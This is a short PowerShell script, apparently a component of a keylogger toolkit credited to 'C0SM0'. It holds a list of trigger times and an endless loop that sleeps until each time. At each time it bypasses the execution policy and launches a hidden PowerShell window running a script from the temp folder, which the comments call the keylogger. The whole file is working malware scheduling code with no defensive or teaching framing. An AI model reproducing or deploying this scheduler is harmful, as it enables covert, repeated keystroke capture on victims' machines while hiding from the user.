# powershell log scheduler
# created by : C0SM0

# times logs will be sent [keep in military time]
$logTimes = @(
    '00:00:00',
    '01:00:00',
    '02:00:00',
    '03:00:00',
    '04:00:00',
    '05:00:00',
    '06:00:00',
    '07:00:00',
    '08:00:00',
    '09:00:00',
    '10:00:00',
    '11:00:00',
    '12:11:00',
    '12:35:00',
    '12:36:00',
    '12:37:00',
    '12:38:00',
    '12:39:00',
    '12:40:00',
    '12:41:00',
    '12:42:00',
    '12:43:00',
    '12:44:00',
    '12:45:00',
    '12:46:00',
    '12:47:00',
    '12:48:00',
    '12:49:00',
    '12:50:00',
    '12:51:00',
    '12:52:00',
    '12:53:00',
    '12:54:00',
    '12:55:00',
    '12:56:00',
    '12:57:00',
    '12:58:00',
    '12:59:00',
    '13:00:00',
    '14:00:00',
    '15:00:00',
    '16:00:00',
    '17:00:00',
    '18:00:00',
    '19:00:00',
    '20:00:00',
    '21:00:00',
    '22:00:00',
    '23:00:00'
)

# sort the times in chronological order
$logTimes = $logTimes | Sort-Object

# ensure keylogger runs every day
while ($true) {

    # run keylogger for each trigger time
    foreach ($t in $logTimes)
    {
        # checks if time passed already
        if((Get-Date) -lt (Get-Date -Date $t))
        {
            # sleeps until next time is reached
            while ((Get-Date -Date $t) -gt (Get-Date))
            {
              # sleeps
              (Get-Date -Date $t) - (Get-Date) | Start-Sleep
            }
  
            # runs keylogger
            powershell Set-ExecutionPolicy -ExecutionPolicy ByPass -Scope Process
            powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/p.ps1"
        }
    }
}